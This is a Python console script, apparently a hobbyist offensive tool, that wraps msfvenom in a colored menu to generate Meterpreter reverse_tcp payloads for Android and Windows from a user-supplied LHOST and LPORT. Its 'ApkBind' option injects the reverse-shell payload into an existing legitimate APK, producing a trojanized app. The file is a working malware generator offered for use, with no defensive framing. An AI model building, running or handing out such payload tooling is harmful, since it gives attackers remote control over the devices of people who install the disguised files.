import os
from colorama import Fore, Style
from prettytable import PrettyTable

# Clear console
os.system('cls' if os.name == 'nt' else 'clear')

# Print title
print(Fore.CYAN + """========================================
            
▒█░░▒█ █▀▀ █░░ █▀▀ █▀▀█ █▀▄▀█ █▀▀ 
▒█▒█▒█ █▀▀ █░░ █░░ █░░█ █░▀░█ █▀▀ 
▒█▄▀▄█ ▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀▀ ▀░░░▀ ▀▀▀░                                 Owner=Akshay
=========================================
""" + Style.RESET_ALL)

# Create table
table = PrettyTable()
table.field_names = [Fore.YELLOW + "Choice", Fore.YELLOW + "Payload Type" + Style.RESET_ALL]
table.add_row([Fore.GREEN + "1", "     Android   📱 " + Style.RESET_ALL])
table.add_row([Fore.GREEN + "2", "     Laptop    💻 " + Style.RESET_ALL])
table.add_row([Fore.GREEN + "3", "     Computer  🖥️ " + Style.RESET_ALL])
table.add_row([Fore.GREEN + "4", "     ApkBind   👻 " + Style.RESET_ALL])
table.add_row([Fore.GREEN + "5", "     Exit      🚪 " + Style.RESET_ALL])

# Loop until user exits
while True:
    # Print table
    print(table)

    # Get user input
    choice = input(Fore.CYAN  + "Enter your choice (1-5): " + Style.RESET_ALL)

    if choice == "1":
        # Generate payload for Android
        lhost = input(Fore.BLUE + "\nEnter LHOST: " + Style.RESET_ALL)
        lport = input(Fore.BLUE + "Enter LPORT: " + Style.RESET_ALL)
        os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o /home/kali/Payload/GeneratedPayload/android_payload.apk")
        print(Fore.GREEN + "Android payload generated successfully!" + Style.RESET_ALL)
        break
        
    elif choice == "2":
        # Generate payload for Laptop
        lhost = input(Fore.BLUE + "\nEnter LHOST: " + Style.RESET_ALL)
        lport = input(Fore.BLUE + "Enter LPORT: " + Style.RESET_ALL)
        os.system(f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o /home/kali/Payload/GeneratedPayload/laptop_payload.exe")
        print(Fore.GREEN + "Laptop payload generated successfully!" + Style.RESET_ALL)
        break
        
    elif choice == "3":
        # Generate payload for Computer
        lhost = input(Fore.BLUE + "\nEnter LHOST: " + Style.RESET_ALL)
        lport = input(Fore.BLUE + "Enter LPORT: " + Style.RESET_ALL)
        os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o /home/kali/Payload/GeneratedPayload/computer_payload.exe")
        print(Fore.GREEN + "Computer payload generated successfully!" + Style.RESET_ALL)
        break
        

    elif choice == "4":
        try:
        	apk_location = input(Fore.BLUE + "Enter the path to the original APK file: "  + Style.RESET_ALL)
        	payload_location = input(Fore.BLUE +"Enter the path to save the generated payload: " + Style.RESET_ALL)
        	lhost = input(Fore.BLUE +"Enter the LHOST for the payload: " + Style.RESET_ALL)
        	lport = input(Fore.BLUE + "Enter the LPORT for the payload: " )
        	os.system(f"msfvenom -x {apk_location} -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {payload_location}")
        	print(f"Payload generated successfully and saved to {payload_location}")
        except Exception as e:
        	print("Error: ", e)




    elif choice == "5":
    	    print("Exiting...")
    	    exit()
    	

        
        
